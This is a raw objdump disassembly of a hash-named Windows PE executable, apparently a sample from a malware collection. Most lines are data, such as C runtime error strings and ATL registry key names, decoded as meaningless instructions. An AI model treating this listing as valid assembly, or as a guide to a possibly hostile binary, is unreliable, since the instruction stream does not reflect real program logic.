
1d9284fd7818d17f4aa4d07b6497735ed8522f9925b348a3fa5ba96a976a5927.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	loopne 0x401054
  401006:	inc    eax
  401007:	add    BYTE PTR [eax],dl
  401009:	sbb    al,0x40
  40100b:	add    BYTE PTR [eax],dh
  40100d:	sbb    al,0x40
  40100f:	add    al,al
  401011:	sbb    eax,DWORD PTR [eax+0x0]
	...
  40101c:	adc    BYTE PTR [esi+0x40],cl
  40101f:	add    BYTE PTR [eax+0x55],dh
  401022:	inc    eax
  401023:	add    BYTE PTR [eax],al
  401025:	add    BYTE PTR [eax],al
  401027:	add    al,al
  401029:	sbb    eax,DWORD PTR [eax]
  40102b:	add    BYTE PTR [eax],dl
  40102d:	sbb    al,0x0
  40102f:	add    BYTE PTR [eax],dh
  401031:	sbb    al,0x0
  401033:	add    BYTE PTR [eax],dh
  401035:	push   ds
  401036:	add    BYTE PTR [eax],al
  401038:	inc    eax
  401039:	push   ds
  40103a:	add    BYTE PTR [eax],al
  40103c:	push   eax
  40103d:	push   ds
  40103e:	add    BYTE PTR [eax],al
  401040:	pusha  
  401041:	push   ds
  401042:	add    BYTE PTR [eax],al
  401044:	xor    BYTE PTR [edi],bl
  401046:	add    BYTE PTR [eax],al
  401048:	inc    eax
  401049:	pop    ds
  40104a:	add    BYTE PTR [eax],al
  40104c:	pusha  
  40104d:	pop    ds
  40104e:	add    BYTE PTR [eax],al
  401050:	sbb    BYTE PTR [edi],0x0
  401053:	add    al,ah
  401055:	and    al,0x0
  401057:	add    BYTE PTR [eax],al
  401059:	and    eax,0x25100000
  40105e:	add    BYTE PTR [eax],al
  401060:	and    BYTE PTR ds:0x25c00000,0x0
  401067:	add    BYTE PTR [eax],al
  401069:	sub    BYTE PTR [eax],al
  40106b:	add    al,dh
  40106d:	aas    
  40106e:	add    BYTE PTR [eax],al
  401070:	lock inc ecx
  401072:	add    BYTE PTR [eax],al
  401074:	inc    eax
  401075:	inc    esi
  401076:	add    BYTE PTR [eax],al
  401078:	ror    BYTE PTR [eax+eax*1+0x0],0x20
  40107d:	dec    ebp
  40107e:	add    BYTE PTR [eax],al
  401080:	inc    eax
  401081:	dec    ebp
  401082:	add    BYTE PTR [eax],al
  401084:	jo     0x4010d3
  401086:	add    BYTE PTR [eax],al
  401088:	adc    BYTE PTR [esi+0x0],cl
  40108b:	add    al,ah
  40108d:	dec    esi
  40108e:	add    BYTE PTR [eax],al
  401090:	pusha  
  401091:	push   ecx
  401092:	add    BYTE PTR [eax],al
  401094:	jo     0x4010e7
  401096:	add    BYTE PTR [eax],al
  401098:	inc    eax
  401099:	push   edx
  40109a:	add    BYTE PTR [eax],al
  40109c:	nop
  40109d:	push   esp
  40109e:	add    BYTE PTR [eax],al
  4010a0:	rcl    BYTE PTR [eax+eax*1+0x0],1
  4010a4:	lock push esp
  4010a6:	add    BYTE PTR [eax],al
  4010a8:	and    BYTE PTR [ebp+0x0],dl
  4010ab:	add    BYTE PTR [eax+0x55],dh
  4010ae:	add    BYTE PTR [eax],al
  4010b0:	push   eax
  4010b1:	push   esi
  4010b2:	add    BYTE PTR [eax],al
  4010b4:	loopne 0x40110e
  4010b6:	add    BYTE PTR [eax],al
  4010b8:	adc    BYTE PTR [ecx+0x0],bl
  4010bb:	add    BYTE PTR [eax-0x2fffffa3],dh
  4010c1:	pop    ebp
  4010c2:	add    BYTE PTR [eax],al
  4010c4:	lock pop ebp
  4010c6:	add    BYTE PTR [eax],al
  4010c8:	inc    eax
  4010c9:	pop    esi
  4010ca:	add    BYTE PTR [eax],al
  4010cc:	add    BYTE PTR [eax],al
  4010ce:	add    BYTE PTR [eax],al
  4010d0:	bound  esp,QWORD PTR [ecx+0x64]
  4010d3:	and    BYTE PTR [ecx+0x6c],ah
  4010d6:	ins    BYTE PTR es:[edi],dx
  4010d7:	outs   dx,DWORD PTR ds:[esi]
  4010d8:	arpl   WORD PTR [ecx+0x74],sp
  4010db:	imul   ebp,DWORD PTR [edi+0x6e],0x4d400000
  4010e2:	inc    eax
  4010e3:	add    al,dh
  4010e5:	push   esp
  4010e6:	inc    eax
  4010e7:	add    BYTE PTR [eax+0x4d],dh
  4010ea:	inc    eax
  4010eb:	add    al,al
  4010ed:	jno    0x40112f
  4010ef:	add    BYTE PTR [eax],dl
  4010f1:	jb     0x401133
  4010f3:	add    BYTE PTR [eax+0x49004054],dl
  4010f9:	outs   dx,BYTE PTR ds:[esi]
  4010fa:	jbe    0x40115d
  4010fc:	ins    BYTE PTR es:[edi],dx
  4010fd:	imul   esp,DWORD PTR [eax+eiz*1+0x70],0x6d617261
  401105:	gs je  0x40116d
  401108:	jb     0x40112a
  40110a:	jo     0x40116d
  40110c:	jae    0x401181
  40110e:	gs and BYTE PTR fs:[edi+ebp*2+0x20],dh
  401114:	inc    ebx
  401115:	and    BYTE PTR [edx+0x75],dh
  401118:	outs   dx,BYTE PTR ds:[esi]
  401119:	je     0x401184
  40111b:	ins    DWORD PTR es:[edi],dx
  40111c:	and    BYTE PTR gs:[esi+0x75],ah
  401120:	outs   dx,BYTE PTR ds:[esi]
  401121:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  401125:	outs   dx,BYTE PTR ds:[esi]
  401126:	or     al,BYTE PTR cs:[eax]
  401129:	add    BYTE PTR [eax],al
  40112b:	add    BYTE PTR [eax],al
  40112d:	add    BYTE PTR [eax],al
  40112f:	add    BYTE PTR [ecx+0x0],al
  401132:	push   eax
  401133:	add    BYTE PTR [ecx+0x0],cl
  401136:	sub    eax,0x53004d00
  40113b:	add    BYTE PTR ds:0x69005700,ch
  401141:	add    BYTE PTR [esi+0x0],ch
  401144:	sub    eax,0x6f004300
  401149:	add    BYTE PTR [edx+0x0],dh
  40114c:	add    BYTE PTR gs:0x6f004c00,ch
  401153:	add    BYTE PTR [ebx+0x0],ah
  401156:	popa   
  401157:	add    BYTE PTR [eax+eax*1+0x52],ch
  40115b:	add    BYTE PTR [ebp+0x0],ah
  40115e:	add    BYTE PTR [bx+di+0x0],ch
  401162:	jae    0x401164
  401164:	je     0x401166
  401166:	jb     0x401168
  401168:	jns    0x40116a
  40116a:	sub    eax,0x31004c00
  40116f:	add    BYTE PTR ds:0x2d003100,ch
  401175:	add    BYTE PTR [eax],dh
  401177:	add    BYTE PTR [esi],ch
  401179:	add    BYTE PTR [eax+eax*1+0x6c],ah
  40117d:	add    BYTE PTR [eax+eax*1+0x0],ch
  401181:	add    BYTE PTR [eax],al
  401183:	add    BYTE PTR [edx+0x65],dl
  401186:	addr16 inc esp
  401188:	gs ins BYTE PTR es:[edi],dx
  40118a:	gs je  0x4011f2
  40118d:	dec    ebx
  40118e:	gs jns 0x4011d6
  401191:	js     0x4011ea
  401193:	add    BYTE PTR [ecx+0x0],ah
  401196:	add    BYTE PTR fs:[esi+0x0],dh
  40119a:	popa   
  40119b:	add    BYTE PTR [eax+0x0],dh
  40119e:	imul   eax,DWORD PTR [eax],0x320033
  4011a4:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  4011a9:	add    BYTE PTR [eax+eax*1+0x0],ch
  4011ad:	add    BYTE PTR [eax],al
  4011af:	add    BYTE PTR [edx+0x65],dl
  4011b2:	addr16 inc esp
  4011b4:	gs ins BYTE PTR es:[edi],dx
  4011b6:	gs je  0x40121e
  4011b9:	dec    ebx
  4011ba:	gs jns 0x401214
  4011bd:	add    BYTE PTR [eax],al
  4011bf:	add    BYTE PTR [ebx+0x0],al
  4011c2:	dec    esp
  4011c3:	add    BYTE PTR [ebx+0x0],dl
  4011c6:	dec    ecx
  4011c7:	add    BYTE PTR [eax+eax*1+0x0],al
  4011cb:	add    BYTE PTR [ecx+0x0],al
  4011ce:	jo     0x4011d0
  4011d0:	jo     0x4011d2
  4011d2:	dec    ecx
  4011d3:	add    BYTE PTR [eax+eax*1+0x0],al
  4011d7:	add    BYTE PTR [ebx+0x0],dl
  4011da:	add    BYTE PTR [eax],al
  4011dc:	dec    ebp
  4011dd:	add    BYTE PTR [eax],al
  4011df:	add    BYTE PTR [eax+eax*1+0x0],al
  4011e3:	add    BYTE PTR [edx+0x0],al
  4011e6:	add    BYTE PTR [eax],al
  4011e8:	push   esi
  4011e9:	add    BYTE PTR [ecx+0x0],ah
  4011ec:	ins    BYTE PTR es:[edi],dx
  4011ed:	add    BYTE PTR [eax],al
  4011ef:	add    BYTE PTR [esi+0x0],al
  4011f2:	outs   dx,DWORD PTR ds:[esi]
  4011f3:	add    BYTE PTR [edx+0x0],dh
  4011f6:	arpl   WORD PTR [eax],ax
  4011f8:	add    BYTE PTR gs:[edx+0x0],dl
  4011fc:	add    BYTE PTR gs:[ebp+0x0],ch
  401200:	outs   dx,DWORD PTR ds:[esi]
  401201:	add    BYTE PTR [esi+0x0],dh
  401204:	add    BYTE PTR gs:[eax],al
  401207:	add    BYTE PTR [esi+0x0],cl
  40120a:	outs   dx,DWORD PTR ds:[esi]
  40120b:	add    BYTE PTR [edx+0x0],dl
  40120e:	add    BYTE PTR gs:[ebp+0x0],ch
  401212:	outs   dx,DWORD PTR ds:[esi]
  401213:	add    BYTE PTR [esi+0x0],dh
  401216:	add    BYTE PTR gs:[eax],al
  401219:	add    BYTE PTR [eax],al
  40121b:	add    BYTE PTR [eax+eax*1+0x65],al
  40121f:	add    BYTE PTR [eax+eax*1+0x65],ch
  401223:	add    BYTE PTR [eax+eax*1+0x65],dh
  401227:	add    BYTE PTR [eax],al
  401229:	add    BYTE PTR [eax],al
  40122b:	add    BYTE PTR [ebx+0x0],al
  40122e:	outs   dx,DWORD PTR ds:[esi]
  40122f:	add    BYTE PTR [ebp+0x0],ch
  401232:	jo     0x401234
  401234:	outs   dx,DWORD PTR ds:[esi]
  401235:	add    BYTE PTR [esi+0x0],ch
  401238:	add    BYTE PTR gs:[esi+0x0],ch
  40123c:	je     0x40123e
  40123e:	and    BYTE PTR [eax],al
  401240:	inc    ebx
  401241:	add    BYTE PTR [ecx+0x0],ah
  401244:	je     0x401246
  401246:	add    BYTE PTR gs:[edi+0x0],ah
  40124a:	outs   dx,DWORD PTR ds:[esi]
  40124b:	add    BYTE PTR [edx+0x0],dh
  40124e:	imul   eax,DWORD PTR [eax],0x730065
  401254:	add    BYTE PTR [eax],al
  401256:	add    BYTE PTR [eax],al
  401258:	inc    esi
  401259:	add    BYTE PTR [ecx+0x0],ch
  40125c:	ins    BYTE PTR es:[edi],dx
  40125d:	add    BYTE PTR [ebp+0x0],ah
  401260:	push   esp
  401261:	add    BYTE PTR [ecx+0x0],bh
  401264:	jo     0x401266
  401266:	add    BYTE PTR gs:[eax],al
  401269:	add    BYTE PTR [eax],al
  40126b:	add    BYTE PTR [ecx+0x0],cl
  40126e:	outs   dx,BYTE PTR ds:[esi]
  40126f:	add    BYTE PTR [eax+eax*1+0x65],dh
  401273:	add    BYTE PTR [edx+0x0],dh
  401276:	data16 add BYTE PTR [ecx+0x0],ah
  40127a:	arpl   WORD PTR [eax],ax
  40127c:	add    BYTE PTR gs:[eax],al
  40127f:	add    BYTE PTR [eax+0x0],cl
  401282:	popa   
  401283:	add    BYTE PTR [edx+0x0],dh
  401286:	add    BYTE PTR fs:[edi+0x0],dh
  40128a:	popa   
  40128b:	add    BYTE PTR [edx+0x0],dh
  40128e:	add    BYTE PTR gs:[eax],al
  401291:	add    BYTE PTR [eax],al
  401293:	add    BYTE PTR [ebp+0x0],cl
  401296:	imul   eax,DWORD PTR [eax],0x65006d
  40129c:	add    BYTE PTR [eax],al
  40129e:	add    BYTE PTR [eax],al
  4012a0:	push   ebx
  4012a1:	add    BYTE PTR [ecx+0x0],al
  4012a4:	dec    ebp
  4012a5:	add    BYTE PTR [eax],al
  4012a7:	add    BYTE PTR [ebx+0x0],dl
  4012aa:	inc    ebp
  4012ab:	add    BYTE PTR [ebx+0x0],al
  4012ae:	push   ebp
  4012af:	add    BYTE PTR [edx+0x0],dl
  4012b2:	dec    ecx
  4012b3:	add    BYTE PTR [eax+eax*1+0x59],dl
  4012b7:	add    BYTE PTR [eax],al
  4012b9:	add    BYTE PTR [eax],al
  4012bb:	add    BYTE PTR [ebx+0x0],dl
  4012be:	pop    ecx
  4012bf:	add    BYTE PTR [ebx+0x0],dl
  4012c2:	push   esp
  4012c3:	add    BYTE PTR [ebp+0x0],al
  4012c6:	dec    ebp
  4012c7:	add    BYTE PTR [eax],al
  4012c9:	add    BYTE PTR [eax],al
  4012cb:	add    BYTE PTR [ebx+0x0],dl
  4012ce:	outs   dx,DWORD PTR ds:[esi]
  4012cf:	add    BYTE PTR [esi+0x0],ah
  4012d2:	je     0x4012d4
  4012d4:	ja     0x4012d6
  4012d6:	popa   
  4012d7:	add    BYTE PTR [edx+0x0],dh
  4012da:	add    BYTE PTR gs:[eax],al
  4012dd:	add    BYTE PTR [eax],al
  4012df:	add    BYTE PTR [eax+eax*1+0x79],dl
  4012e3:	add    BYTE PTR [eax+0x0],dh
  4012e6:	add    BYTE PTR gs:[eax+eax*1+0x69],cl
  4012eb:	add    BYTE PTR [edx+0x0],ah
  4012ee:	add    BYTE PTR [eax],al
  4012f0:	dec    eax
  4012f1:	add    BYTE PTR [ebx+0x0],cl
  4012f4:	inc    ebx
  4012f5:	add    BYTE PTR [edx+0x0],dl
  4012f8:	add    BYTE PTR [eax],al
  4012fa:	add    BYTE PTR [eax],al
  4012fc:	dec    eax
  4012fd:	add    BYTE PTR [ebx+0x0],cl
  401300:	inc    ebx
  401301:	add    BYTE PTR [ebp+0x0],dl
  401304:	add    BYTE PTR [eax],al
  401306:	add    BYTE PTR [eax],al
  401308:	dec    eax
  401309:	add    BYTE PTR [ebx+0x0],cl
  40130c:	dec    esp
  40130d:	add    BYTE PTR [ebp+0x0],cl
  401310:	add    BYTE PTR [eax],al
  401312:	add    BYTE PTR [eax],al
  401314:	dec    eax
  401315:	add    BYTE PTR [ebx+0x0],cl
  401318:	push   ebp
  401319:	add    BYTE PTR [eax],al
  40131b:	add    BYTE PTR [eax+0x0],cl
  40131e:	dec    ebx
  40131f:	add    BYTE PTR [eax+0x0],dl
  401322:	inc    esp
  401323:	add    BYTE PTR [eax],al
  401325:	add    BYTE PTR [eax],al
  401327:	add    BYTE PTR [eax+0x0],cl
  40132a:	dec    ebx
  40132b:	add    BYTE PTR [eax+eax*1+0x44],al
  40132f:	add    BYTE PTR [eax],al
  401331:	add    BYTE PTR [eax],al
  401333:	add    BYTE PTR [eax+0x0],cl
  401336:	dec    ebx
  401337:	add    BYTE PTR [ebx+0x0],al
  40133a:	inc    ebx
  40133b:	add    BYTE PTR [eax],al
  40133d:	add    BYTE PTR [eax],al
  40133f:	add    BYTE PTR [eax+0x0],cl
  401342:	dec    ebx
  401343:	add    BYTE PTR [ebp+0x0],al
  401346:	pop    ecx
  401347:	add    BYTE PTR [edi+0x0],bl
  40134a:	inc    ebx
  40134b:	add    BYTE PTR [eax+eax*1+0x41],cl
  40134f:	add    BYTE PTR [ebx+0x0],dl
  401352:	push   ebx
  401353:	add    BYTE PTR [ebp+0x0],al
  401356:	push   ebx
  401357:	add    BYTE PTR [edi+0x0],bl
  40135a:	push   edx
  40135b:	add    BYTE PTR [edi+0x0],cl
  40135e:	dec    edi
  40135f:	add    BYTE PTR [eax+eax*1+0x0],dl
  401363:	add    BYTE PTR [eax+0x0],cl
  401366:	dec    ebx
  401367:	add    BYTE PTR [ebp+0x0],al
  40136a:	pop    ecx
  40136b:	add    BYTE PTR [edi+0x0],bl
  40136e:	inc    ebx
  40136f:	add    BYTE PTR [ebp+0x0],dl
  401372:	push   edx
  401373:	add    BYTE PTR [edx+0x0],dl
  401376:	inc    ebp
  401377:	add    BYTE PTR [esi+0x0],cl
  40137a:	push   esp
  40137b:	add    BYTE PTR [edi+0x0],bl
  40137e:	push   ebp
  40137f:	add    BYTE PTR [ebx+0x0],dl
  401382:	inc    ebp
  401383:	add    BYTE PTR [edx+0x0],dl
  401386:	add    BYTE PTR [eax],al
  401388:	dec    eax
  401389:	add    BYTE PTR [ebx+0x0],cl
  40138c:	inc    ebp
  40138d:	add    BYTE PTR [ecx+0x0],bl
  401390:	pop    edi
  401391:	add    BYTE PTR [eax+eax*1+0x4f],cl
  401395:	add    BYTE PTR [ebx+0x0],al
  401398:	inc    ecx
  401399:	add    BYTE PTR [eax+eax*1+0x5f],cl
  40139d:	add    BYTE PTR [ebp+0x0],cl
  4013a0:	inc    ecx
  4013a1:	add    BYTE PTR [ebx+0x0],al
  4013a4:	dec    eax
  4013a5:	add    BYTE PTR [ecx+0x0],cl
  4013a8:	dec    esi
  4013a9:	add    BYTE PTR [ebp+0x0],al
  4013ac:	add    BYTE PTR [eax],al
  4013ae:	add    BYTE PTR [eax],al
  4013b0:	dec    eax
  4013b1:	add    BYTE PTR [ebx+0x0],cl
  4013b4:	inc    ebp
  4013b5:	add    BYTE PTR [ecx+0x0],bl
  4013b8:	pop    edi
  4013b9:	add    BYTE PTR [ebp+0x0],dl
  4013bc:	push   ebx
  4013bd:	add    BYTE PTR [ebp+0x0],al
  4013c0:	push   edx
  4013c1:	add    BYTE PTR [ebx+0x0],dl
  4013c4:	add    BYTE PTR [eax],al
  4013c6:	add    BYTE PTR [eax],al
  4013c8:	dec    eax
  4013c9:	add    BYTE PTR [ebx+0x0],cl
  4013cc:	inc    ebp
  4013cd:	add    BYTE PTR [ecx+0x0],bl
  4013d0:	pop    edi
  4013d1:	add    BYTE PTR [eax+0x0],dl
  4013d4:	inc    ebp
  4013d5:	add    BYTE PTR [edx+0x0],dl
  4013d8:	inc    esi
  4013d9:	add    BYTE PTR [edi+0x0],cl
  4013dc:	push   edx
  4013dd:	add    BYTE PTR [ebp+0x0],cl
  4013e0:	inc    ecx
  4013e1:	add    BYTE PTR [esi+0x0],cl
  4013e4:	inc    ebx
  4013e5:	add    BYTE PTR [ebp+0x0],al
  4013e8:	pop    edi
  4013e9:	add    BYTE PTR [eax+eax*1+0x41],al
  4013ed:	add    BYTE PTR [eax+eax*1+0x41],dl
  4013f1:	add    BYTE PTR [eax],al
  4013f3:	add    BYTE PTR [eax+0x0],cl
  4013f6:	dec    ebx
  4013f7:	add    BYTE PTR [ebp+0x0],al
  4013fa:	pop    ecx
  4013fb:	add    BYTE PTR [edi+0x0],bl
  4013fe:	inc    esp
  4013ff:	add    BYTE PTR [ecx+0x0],bl
  401402:	dec    esi
  401403:	add    BYTE PTR [edi+0x0],bl
  401406:	inc    esp
  401407:	add    BYTE PTR [ecx+0x0],al
  40140a:	push   esp
  40140b:	add    BYTE PTR [ecx+0x0],al
  40140e:	add    BYTE PTR [eax],al
  401410:	dec    eax
  401411:	add    BYTE PTR [ebx+0x0],cl
  401414:	inc    ebp
  401415:	add    BYTE PTR [ecx+0x0],bl
  401418:	pop    edi
  401419:	add    BYTE PTR [ebx+0x0],al
  40141c:	push   ebp
  40141d:	add    BYTE PTR [edx+0x0],dl
  401420:	push   edx
  401421:	add    BYTE PTR [ebp+0x0],al
  401424:	dec    esi
  401425:	add    BYTE PTR [eax+eax*1+0x5f],dl
  401429:	add    BYTE PTR [ebx+0x0],al
  40142c:	dec    edi
  40142d:	add    BYTE PTR [esi+0x0],cl
  401430:	inc    esi
  401431:	add    BYTE PTR [ecx+0x0],cl
  401434:	inc    edi
  401435:	add    BYTE PTR [eax],al
  401437:	add    BYTE PTR [ebp+0x0],cl
  40143a:	outs   dx,DWORD PTR ds:[esi]
  40143b:	add    BYTE PTR [eax+eax*1+0x75],ah
  40143f:	add    BYTE PTR [eax+eax*1+0x65],ch
  401443:	add    BYTE PTR [eax],al
  401445:	add    BYTE PTR [eax],al
  401447:	add    BYTE PTR [ebp+0x0],cl
  40144a:	outs   dx,DWORD PTR ds:[esi]
  40144b:	add    BYTE PTR [eax+eax*1+0x75],ah
  40144f:	add    BYTE PTR [eax+eax*1+0x65],ch
  401453:	add    BYTE PTR [edi+0x0],bl
  401456:	push   edx
  401457:	add    BYTE PTR [ecx+0x0],ah
  40145a:	ja     0x40145c
  40145c:	add    BYTE PTR [eax],al
  40145e:	add    BYTE PTR [eax],al
  401460:	push   edx
  401461:	add    BYTE PTR [ebp+0x0],al
  401464:	inc    edi
  401465:	add    BYTE PTR [ecx+0x0],cl
  401468:	push   ebx
  401469:	add    BYTE PTR [eax+eax*1+0x52],dl
  40146d:	add    BYTE PTR [ecx+0x0],bl
	...
  401478:	cmp    al,0x0
  40147a:	dec    esi
  40147b:	add    BYTE PTR [ebp+0x0],dl
  40147e:	dec    esp
  40147f:	add    BYTE PTR [eax+eax*1+0x3e],cl
  401483:	add    BYTE PTR [eax],al
  401485:	add    BYTE PTR [eax],al
  401487:	add    BYTE PTR [esi+0x0],cl
  40148a:	push   ebp
  40148b:	add    BYTE PTR [eax+eax*1+0x4c],cl
  40148f:	add    BYTE PTR [eax],al
  401491:	add    BYTE PTR [eax],al
  401493:	add    BYTE PTR [esi+0x55],cl
  401496:	dec    esp
  401497:	dec    esp
  401498:	add    BYTE PTR [eax],al
  40149a:	add    BYTE PTR [eax],al
  40149c:	inc    ebp
  40149d:	add    BYTE PTR [eax+0x0],bh
  4014a0:	je     0x4014a2
  4014a2:	add    BYTE PTR gs:[esi+0x0],ch
  4014a6:	jae    0x4014a8
  4014a8:	imul   eax,DWORD PTR [eax],0x6c0062
  4014ae:	add    BYTE PTR gs:[eax],ah
  4014b1:	add    BYTE PTR [edi+0x0],dl
  4014b4:	imul   eax,DWORD PTR [eax],0x61007a
  4014ba:	jb     0x4014bc
  4014bc:	add    BYTE PTR fs:[eax],ah
  4014bf:	add    BYTE PTR [eax+0x0],cl
  4014c2:	outs   dx,DWORD PTR ds:[esi]
  4014c3:	add    BYTE PTR [ebx+0x0],dh
  4014c6:	je     0x4014c8
  4014c8:	add    BYTE PTR [eax],al
  4014ca:	add    BYTE PTR [eax],al
  4014cc:	js     0x4014ce
  4014ce:	ja     0x4014d0
  4014d0:	imul   eax,DWORD PTR [eax],0x61007a
  4014d6:	jb     0x4014d8
  4014d8:	add    BYTE PTR fs:[ebx+0x0],dh
  4014dc:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  4014e1:	add    BYTE PTR [eax+eax*1+0x0],ch
  4014e5:	add    BYTE PTR [eax],al
  4014e7:	add    BYTE PTR [ecx+0x0],al
  4014ea:	push   eax
  4014eb:	add    BYTE PTR [eax+0x0],dl
  4014ee:	dec    ecx
  4014ef:	add    BYTE PTR [eax+eax*1+0x0],al
  4014f3:	add    BYTE PTR [eax+0x17],al
  4014f6:	inc    eax
  4014f7:	add    BYTE PTR [eax+0x3000401f],al
  4014fd:	push   ds
  4014fe:	inc    eax
  4014ff:	add    BYTE PTR [eax+0x1e],al
  401502:	inc    eax
  401503:	add    BYTE PTR [eax+0x1e],dl
  401506:	inc    eax
  401507:	add    BYTE PTR [eax+0x1e],ah
  40150a:	inc    eax
  40150b:	add    BYTE PTR [eax+0x46],al
  40150e:	inc    eax
  40150f:	add    BYTE PTR [eax],dh
  401511:	pop    ds
  401512:	inc    eax
  401513:	add    BYTE PTR [eax],dh
  401515:	pop    ds
  401516:	inc    eax
  401517:	add    BYTE PTR [eax+0x1f],ah
  40151a:	inc    eax
  40151b:	add    BYTE PTR [eax+0x1f],al
  40151e:	inc    eax
  40151f:	add    BYTE PTR [eax+ebx*1+0x40],ah
  401523:	add    al,ah
  401525:	and    al,0x40
  401527:	add    BYTE PTR [eax],al
  401529:	and    eax,0x25100040
  40152e:	inc    eax
  40152f:	add    al,al
  401531:	and    eax,0x28000040
  401536:	inc    eax
  401537:	add    BYTE PTR [eax+0x4025],al
  40153d:	add    BYTE PTR [eax],al
  40153f:	add    al,dh
  401541:	adc    al,BYTE PTR [eax+0x0]
  401544:	add    BYTE PTR [eax],al
  401546:	add    BYTE PTR [eax+0x4012fc],al
  40154c:	add    DWORD PTR [eax],eax
  40154e:	add    BYTE PTR [eax+0x401308],al
  401554:	add    al,BYTE PTR [eax]
  401556:	add    BYTE PTR [eax+0x401314],al
  40155c:	add    eax,DWORD PTR [eax]
  40155e:	add    BYTE PTR [eax+0x40131c],al
  401564:	add    al,0x0
  401566:	add    BYTE PTR [eax+0x401328],al
  40156c:	push   es
  40156d:	add    BYTE PTR [eax],al
  40156f:	xor    BYTE PTR [ebx+edx*1],0x40
  401573:	add    BYTE PTR ds:0x40800000,al
  401579:	adc    eax,DWORD PTR [eax+0x0]
  40157c:	add    BYTE PTR [eax],al
  40157e:	add    BYTE PTR [eax+0x401364],al
  401584:	add    DWORD PTR [eax],eax
  401586:	add    BYTE PTR [eax+0x401388],al
  40158c:	add    al,BYTE PTR [eax]
  40158e:	add    BYTE PTR [eax+0x4013b0],al
  401594:	add    eax,DWORD PTR [eax]
  401596:	add    BYTE PTR [eax+0x4013c8],al
  40159c:	add    al,0x0
  40159e:	add    BYTE PTR [eax+0x4013f4],al
  4015a4:	push   es
  4015a5:	add    BYTE PTR [eax],al
  4015a7:	adc    BYTE PTR [eax],0x14
  4015aa:	inc    eax
  4015ab:	add    BYTE PTR ds:0x46800000,al
  4015b1:	add    DWORD PTR [eax],eax
  4015b3:	add    BYTE PTR [eax],al
  4015b5:	add    BYTE PTR [eax],al
  4015b7:	add    al,al
  4015b9:	add    BYTE PTR [eax],al
  4015bb:	add    BYTE PTR [eax],al
  4015bd:	add    BYTE PTR [eax],al
  4015bf:	inc    esi
  4015c0:	add    BYTE PTR [eax],al
  4015c2:	add    BYTE PTR [eax],al
  4015c4:	jmp    FWORD PTR [eax+0x2498777b]
  4015ca:	jne    0x401614
  4015cc:	xchg   ebx,eax
  4015cd:	cmp    dh,BYTE PTR [eax]
  4015cf:	fimul  WORD PTR [bx+si+0x7030]
  4015d4:	push   ebp
  4015d5:	add    BYTE PTR ds:0xb7f846b9,bl
  4015db:	jmp    0x694f:0xd46aecfe
  4015e2:	mov    BYTE PTR [edx+0x323],al
  4015e8:	add    BYTE PTR [eax],al
  4015ea:	add    BYTE PTR [eax],al
  4015ec:	rol    BYTE PTR [eax],0x0
  4015ef:	add    BYTE PTR [eax],al
  4015f1:	add    BYTE PTR [eax],al
  4015f3:	inc    esi
	...
  401600:	int3   
  401601:	adc    DWORD PTR [eax+0x0],eax
  401604:	rcl    BYTE PTR [ecx],0x40
  401607:	add    BYTE PTR [edx+edx*1],ch
  40160a:	inc    eax
  40160b:	add    BYTE PTR [eax+0x12],bl
  40160e:	inc    eax
  40160f:	add    BYTE PTR [edx+edx*1+0x40],ch
  401613:	add    BYTE PTR [eax-0x6bffbfee],al
  401619:	adc    al,BYTE PTR [eax+0x0]
  40161c:	mov    al,ds:0xa8004012
  401621:	adc    al,BYTE PTR [eax+0x0]
  401624:	mov    esp,0xcc004012
  401629:	adc    al,BYTE PTR [eax+0x0]
  40162c:	loopne 0x401640
  40162e:	inc    eax
  40162f:	add    al,ah
  401631:	cmp    eax,0x3c6f394c
  401636:	rcl    BYTE PTR [ecx],cl
  401638:	cmp    DWORD PTR [ebx+0x0],0x7a794fc0
  40163f:	mov    bh,0xb8
  401641:	cmp    eax,0x2b99fa45
  401646:	jl     0x401697
  401648:	cdq    
  401649:	adc    cl,BYTE PTR [eax]
  40164b:	cld    
  40164c:	push   esp
  40164d:	int    0x4a
  40164f:	aas    
  401650:	arpl   WORD PTR [eax],ax
  401652:	outs   dx,DWORD PTR ds:[esi]
  401653:	add    BYTE PTR [ebp+0x0],ch
  401656:	arpl   WORD PTR [eax],ax
  401658:	je     0x40165a
  40165a:	ins    BYTE PTR es:[edi],dx
  40165b:	add    BYTE PTR [ebx],dh
  40165d:	add    BYTE PTR [edx],dh
  40165f:	add    BYTE PTR [esi],ch
  401661:	add    BYTE PTR [eax+eax*1+0x6c],ah
  401665:	add    BYTE PTR [eax+eax*1+0x0],ch
	...
  401671:	add    BYTE PTR [eax],al
  401673:	add    ch,bh
  401675:	cmp    al,0x9f
  401677:	push   ebp
  401678:	add    BYTE PTR [eax],al
  40167a:	add    BYTE PTR [eax],al
  40167c:	add    al,BYTE PTR [eax]
  40167e:	add    BYTE PTR [eax],al
  401680:	and    al,0x0
  401682:	add    BYTE PTR [eax],al
  401684:	xor    al,0x19
  401686:	add    BYTE PTR [eax],al
  401688:	xor    al,0xd
  40168a:	add    BYTE PTR [eax],al
  40168c:	add    BYTE PTR [eax],al
  40168e:	add    BYTE PTR [eax],al
  401690:	std    
  401691:	cmp    al,0x9f
  401693:	push   ebp
  401694:	add    BYTE PTR [eax],al
  401696:	add    BYTE PTR [eax],al
  401698:	or     eax,0x4c000000
  40169d:	add    al,BYTE PTR [eax]
  40169f:	add    BYTE PTR [ecx+ebx*1+0x0],ch
  4016a3:	add    BYTE PTR [ebp+ecx*1+0x0],ch
	...
  4016c7:	add    BYTE PTR [eax+0x0],ch
	...
  401702:	add    BYTE PTR [eax],al
  401704:	or     al,0x70
  401706:	inc    eax
  401707:	add    BYTE PTR [eax],dl
  401709:	sbb    DWORD PTR [eax+0x0],eax
  40170c:	or     DWORD PTR [eax],eax
  40170e:	add    BYTE PTR [eax],al
  401710:	fadd   DWORD PTR [ecx+0x40]
  401716:	add    BYTE PTR [eax],al
  401718:	sub    BYTE PTR [eax],dl
  40171a:	inc    eax
  40171b:	add    BYTE PTR [ecx],ch
  40171d:	add    BYTE PTR [eax],al
  40171f:	add    BYTE PTR [eax],al
  401721:	xor    eax,0x0
	...
  401736:	add    BYTE PTR [eax],al
  401738:	add    DWORD PTR [eax],eax
  40173a:	add    BYTE PTR [eax],al
  40173c:	fs pop ss
  40173e:	inc    eax
	...
  40174b:	add    BYTE PTR [eax+0x71],dl
  40174e:	inc    eax
  40174f:	add    ah,dl
